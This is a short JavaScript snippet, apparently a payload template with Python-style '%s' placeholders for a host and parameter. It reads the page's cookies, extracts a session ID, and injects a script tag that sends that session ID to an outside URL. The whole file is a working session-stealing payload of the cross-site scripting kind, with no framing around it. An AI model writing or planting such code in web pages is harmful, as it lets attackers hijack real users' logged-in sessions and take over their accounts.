
var cookies = document.cookie;
var session = cookies.split(';')[0].split("-").join("").split("=");
var sessionId = session[1];

console.log('session: ', sessionId);

var url = "%s?m=%s&s=" + sessionId;

var script = document.createElement('script');
script.src =  url;
script.type = "text/javascript";

document.head.appendChild(script);
